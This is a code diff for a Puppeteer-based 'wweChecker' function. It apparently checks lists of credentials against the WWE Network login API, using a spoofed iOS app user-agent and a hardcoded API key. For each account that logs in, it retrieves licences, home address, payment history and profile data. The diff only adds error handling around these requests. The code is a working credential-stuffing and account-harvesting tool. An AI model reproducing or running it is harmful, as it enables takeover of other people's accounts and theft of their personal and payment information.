@@ -550,59 +550,75 @@ let wweChecker = async (account, page) => {
     await page.goto('https://dce-frontoffice.imggaming.com/api/v2/login');
     // await page.waitFor(1000);
     const tokenObj = await page.evaluate((account) => {
-        return fetch('https://dce-frontoffice.imggaming.com/api/v2/login', {
-            method: 'POST',
-            headers: {
-                "accept": " */*",
-                "content-type": "application/json",
-                "accept-encoding": "gzip;q=1.0, compress;q=0.5",
-                "app": "dice",
-                "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
-                "realm": "dce.wwe",
-                "accept-language": "en-US;q=1.0",
-                "content-length": "47",
-                "user-agent": "WWE Network/4.43.0 (com.wwe.universal; build:12204; iOS 13.3.1) Alamofire/4.9.1"
-            },
-            body: JSON.stringify({
-                id: account.login,
-                // 'goodhannibal28@youtmail.tk',
-                secret: account.password
-                // 'goodhannibal28@youtmail.tk'
-            })
-        }).then(res => res.json())
-            .then(tokenObj => tokenObj)
+        try {
+            return fetch('https://dce-frontoffice.imggaming.com/api/v2/login', {
+                method: 'POST',
+                headers: {
+                    "accept": " */*",
+                    "content-type": "application/json",
+                    "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                    "app": "dice",
+                    "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
+                    "realm": "dce.wwe",
+                    "accept-language": "en-US;q=1.0",
+                    "content-length": "47",
+                    "user-agent": "WWE Network/4.43.0 (com.wwe.universal; build:12204; iOS 13.3.1) Alamofire/4.9.1"
+                },
+                body: JSON.stringify({
+                    id: account.login,
+                    // 'goodhannibal28@youtmail.tk',
+                    secret: account.password
+                    // 'goodhannibal28@youtmail.tk'
+                })
+            }).then(res => res.json())
+                .then(tokenObj => tokenObj)
+        } catch {
+            return {code:null};
+        }
+
     }, account);
     if (tokenObj.code !== "NOT_FOUND") {
         checkResult.validAccount = true;
         checkResult.accountInfo = await page.evaluate((token) => {
-            return fetch('https://dce-frontoffice.imggaming.com/api/v2/user/temporary/licences', {
-                method: 'GET',
-                headers: {
-                    "accept": "*/*",
-                    "accept-encoding": "gzip;q=1.0, compress;q=0.5",
-                    "app": "dice",
-                    "if-none-match": "",
-                    "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
-                    "realm": "dce.wwe",
-                    "accept-language": "en-US;q=1.0",
-                    "authorization": "Bearer " + token
-                }
-            }).then(res => res.json()).then(json => json)
+            try{
+                return fetch('https://dce-frontoffice.imggaming.com/api/v2/user/temporary/licences', {
+                    method: 'GET',
+                    headers: {
+                        "accept": "*/*",
+                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                        "app": "dice",
+                        "if-none-match": "",
+                        "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
+                        "realm": "dce.wwe",
+                        "accept-language": "en-US;q=1.0",
+                        "authorization": "Bearer " + token
+                    }
+                }).then(res => res.json()).then(json => json)
+            }
+            catch {
+                return null;
+            }
+
         }, tokenObj.authorisationToken);
         checkResult.accountInfo.address = await page.evaluate((token)=>{
-            return fetch("https://dce-frontoffice.imggaming.com/api/v2/user/address", {
-                "headers": {
-                    "accept": "*/*",
-                    "accept-encoding": "gzip;q=1.0, compress;q=0.5",
-                    "app": "dice",
-                    "if-none-match": "",
-                    "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
-                    "realm": "dce.wwe",
-                    "accept-language": "en-US;q=1.0",
-                    "authorization": "Bearer " + token
-                },
-                "method": "GET"
-            }).then(res=>res.json()).then(json=>json);
+            try {
+                return fetch("https://dce-frontoffice.imggaming.com/api/v2/user/address", {
+                    "headers": {
+                        "accept": "*/*",
+                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                        "app": "dice",
+                        "if-none-match": "",
+                        "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
+                        "realm": "dce.wwe",
+                        "accept-language": "en-US;q=1.0",
+                        "authorization": "Bearer " + token
+                    },
+                    "method": "GET"
+                }).then(res=>res.json()).then(json=>json);
+            }
+            catch {
+                return null;
+            }
         },tokenObj.authorisationToken);
         checkResult.accountInfo.payment = await page.evaluate((token)=>{
             return fetch("https://dce-frontoffice.imggaming.com/api/v2/customer/history/payment", {
@@ -623,19 +639,24 @@ let wweChecker = async (account, page) => {
             }).then(res=>res.json()).then(json=>json);
         },tokenObj.authorisationToken);
         checkResult.accountInfo.profile = await page.evaluate((token)=>{
-            return fetch("https://dce-frontoffice.imggaming.com/api/v2/user/profile", {
-                "headers": {
-                    "accept": "*/*",
-                    "accept-encoding": "gzip;q=1.0, compress;q=0.5",
-                    "app": "dice",
-                    "if-none-match": "",
-                    "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
-                    "realm": "dce.wwe",
-                    "accept-language": "en-US;q=1.0",
-                    "authorization": "Bearer " + token
-                },
-                "method": "GET",
-            }).then(res=>res.json()).then(json=>json);
+            try {
+                return fetch("https://dce-frontoffice.imggaming.com/api/v2/user/profile", {
+                    "headers": {
+                        "accept": "*/*",
+                        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
+                        "app": "dice",
+                        "if-none-match": "",
+                        "x-api-key": "ef59c096-d95d-428e-ad94-86385070dde2",
+                        "realm": "dce.wwe",
+                        "accept-language": "en-US;q=1.0",
+                        "authorization": "Bearer " + token
+                    },
+                    "method": "GET",
+                }).then(res=>res.json()).then(json=>json);
+            }
+            catch {
+                return null;
+            }
         },tokenObj.authorisationToken)
     }
     console.log(checkResult);
